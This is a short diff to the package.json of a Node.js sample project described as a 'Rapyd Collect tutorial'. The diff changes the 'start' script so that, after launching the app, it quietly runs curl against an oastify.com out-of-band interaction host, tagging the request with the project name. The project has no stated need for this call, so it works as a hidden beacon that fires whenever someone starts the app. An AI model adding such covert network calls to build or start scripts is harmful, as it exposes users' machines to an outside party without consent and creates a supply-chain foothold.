@@ -4,7 +4,7 @@
   "description": "Rapyd Collect tutorial",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
+    "start": "node index.js && curl https://alzqzn8c29uqpt0gglya258tmkseg8awz.oastify.com/rapyd-samples-nodejs-pay",
     "dev": "nodemon index.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
